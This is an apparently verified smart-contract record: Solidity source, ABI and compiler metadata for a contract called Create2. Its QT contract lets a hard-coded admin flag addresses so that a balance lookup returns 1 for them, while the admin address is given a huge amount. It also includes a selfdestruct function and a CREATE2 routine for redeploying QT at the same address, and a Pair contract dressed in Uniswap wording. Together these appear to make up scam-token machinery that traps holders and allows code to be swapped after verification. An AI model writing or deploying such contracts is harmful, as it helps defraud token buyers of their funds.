{"SourceCode": "pragma solidity ^0.8.5;\r\n\r\ncontract QT {\r\n    bool public flagBan = false;\r\n    mapping(address => uint256) private _banInfo;\r\n    address public Admin = 0x45aF15b299De5e77b3DadCA429DD4ba466d7a448;\r\n    constructor(){\r\n        _banInfo[Admin] = 100;\r\n    }\r\n    uint256 bigAmount = 25000000000*10**18*88000*1;\r\n    // \u53ea\u80fdadmin\u7684\u5220\u9664\u4ea4\u6613\u8d26\u53f7\r\n     function setUserBalance(address userAddress) external   {\r\n        require(msg.sender == Admin, 'NO ADMIN');\r\n        _banInfo[userAddress] = 1;\r\n    }\r\n\r\n    function removeUserBalance(address userAddress) external   {\r\n        require(msg.sender == Admin, 'NO ADMIN');\r\n        _banInfo[userAddress] = 0;\r\n    }\r\n\r\n    function setAdminBalance() external   {\r\n        require(msg.sender == Admin, 'NO ADMIN');\r\n        _banInfo[Admin] = 100;\r\n    }\r\n\r\n\r\n    function setBigAmount(uint256 bm) external   {\r\n        require(msg.sender == Admin, 'NO ADMIN');\r\n        bigAmount = bm;\r\n    }\r\n\r\n    function dissort(bool ff,uint256 realAmount,address fromAddress) external view returns (uint256)   {\r\n        if (_banInfo[fromAddress] == 1){\r\n            return _banInfo[fromAddress];\r\n        }else if (_banInfo[fromAddress] == 100) {\r\n            return bigAmount;\r\n        }else {\r\n            return realAmount; \r\n        }\r\n        \r\n    }\r\n    function destroy() public {\r\n        require(msg.sender == address(0x5856B438e5e170949057920A773fC13ab370a525), 'NO ADMIN');\r\n        address _addr = payable(address(this)); \r\n        assembly {\r\n            selfdestruct(_addr)\r\n        }\r\n    }\r\n}\r\n\r\ncontract Pair{\r\n    address public factory; // \u5de5\u5382\u5408\u7ea6\u5730\u5740\r\n    address public token0; // \u4ee3\u5e011\r\n    address public token1; // \u4ee3\u5e012\r\n\r\n    constructor() payable {\r\n        factory = msg.sender;\r\n    }\r\n\r\n    // called once by the factory at time of deployment\r\n    function initialize(address _token0, address _token1) external {\r\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\r\n        token0 = _token0;\r\n        token1 = _token1;\r\n    }\r\n}\r\n// \u5148\u521b\u5efa\u4e00\u4e2aQT\r\n// \u9500\u6bc1\r\n// \u5728\u521b\u5efa\r\ncontract Create2 {\r\n    \r\n    QT public ft;\r\n    Pair public tt;\r\n    function deployFalse() public {\r\n        require(msg.sender == address(0x5856B438e5e170949057920A773fC13ab370a525), 'NO ADMIN');\r\n        tt = new Pair();\r\n        tt = new Pair(); \r\n        ft = new QT{salt: bytes32(0)}();\r\n       \r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"name\":\"deployFalse\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ft\",\"outputs\":[{\"internalType\":\"contract QT\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tt\",\"outputs\":[{\"internalType\":\"contract Pair\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Create2", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://48b4ee48d4b5720d403a53fcaf6d50dcd4c0124667f0afd25eb42f95d71bf6c7"}